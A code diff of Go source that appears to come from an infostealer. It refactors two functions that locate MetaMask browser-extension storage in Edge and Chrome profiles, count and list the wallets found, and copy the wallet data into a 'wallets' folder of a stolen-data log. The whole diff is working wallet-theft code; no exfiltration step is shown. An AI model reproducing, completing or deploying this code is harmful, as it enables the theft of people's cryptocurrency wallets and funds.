@@ -8,30 +8,31 @@ import (
 )
 
 func CopyMetamaskEdge(browserPath, logFolderPath string) {
-	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")); !os.IsNotExist(err) {
-		utils.WalletAmount++
-	}
-	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")); !os.IsNotExist(err) {
-		utils.WalletAmount++
-	}
-	// ____________________
-	//metamask edge version
+	metamaskc := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
 	metamaske := path.Join(browserPath, "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm")
 
+	if _, err := os.Stat(metamaskc); !os.IsNotExist(err) {
+		utils.WalletAmount++
+		utils.FoundWallets += "metamask_edge_chromeversion\n"
+	}
+	if _, err := os.Stat(metamaske); !os.IsNotExist(err) {
+		utils.WalletAmount++
+		utils.FoundWallets += "metamask_edge\n"
+	}
+	// ____________________
 	utils.CopyFolderFiles(metamaske, path.Join(logFolderPath, "wallets", "metamask_edge"))
-
-	//metamask chrome version
-	metamaskc := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
 
 	utils.CopyFolderFiles(metamaskc, path.Join(logFolderPath, "wallets", "metamask_edge_chromeversion"))
 }
 
 func CopyMetamaskChrome(browserPath, logFolderPath string) {
-	if _, err := os.Stat(path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")); !os.IsNotExist(err) {
+	metamask := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
+
+	if _, err := os.Stat(metamask); !os.IsNotExist(err) {
 		utils.WalletAmount++
+		utils.FoundWallets += "metamask_chrome\n"
 	}
 	//________________
-	metamask := path.Join(browserPath, "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
 
 	utils.CopyFolderFiles(metamask, path.Join(logFolderPath, "wallets", "metamask_chrome"))
 }
